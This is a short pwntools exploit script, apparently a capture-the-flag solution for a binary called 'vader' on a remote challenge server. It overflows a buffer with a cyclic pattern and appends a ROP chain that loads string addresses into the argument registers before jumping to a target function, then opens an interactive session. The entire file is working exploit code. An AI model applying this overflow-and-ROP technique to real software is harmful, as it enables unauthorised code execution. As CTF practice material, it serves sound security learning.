from pwn import *

local = False

if local:
    p = process("./vader")
    input("attach gdb")
else:
    p = remote("0.cloud.chals.io", 20712)

m = p.recvuntil(b">>> ")

vader_addr = 0x40146b

pop_rdi = 0x000000000040165b
pop_rsi_pop_r15 = 0x0000000000401659
pop_rcx_pop_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9

dark_addr = 0x00402ec9
side_addr = 0x00402ece
of_addr = 0x00402ed3
the_addr = 0x00402ed6
force_addr = 0x00402eda


payload = cyclic(500)
payload = payload[:cyclic_find(b"kaaa")] + p64(pop_rdi) + p64(dark_addr) + p64(pop_rsi_pop_r15) + p64(side_addr) \
+ p64(0) + p64(pop_rcx_pop_rdx) + p64(the_addr) + p64(of_addr) + p64(pop_r8) + p64(force_addr) + p64(vader_addr)

p.sendline(payload)

p.interactive()


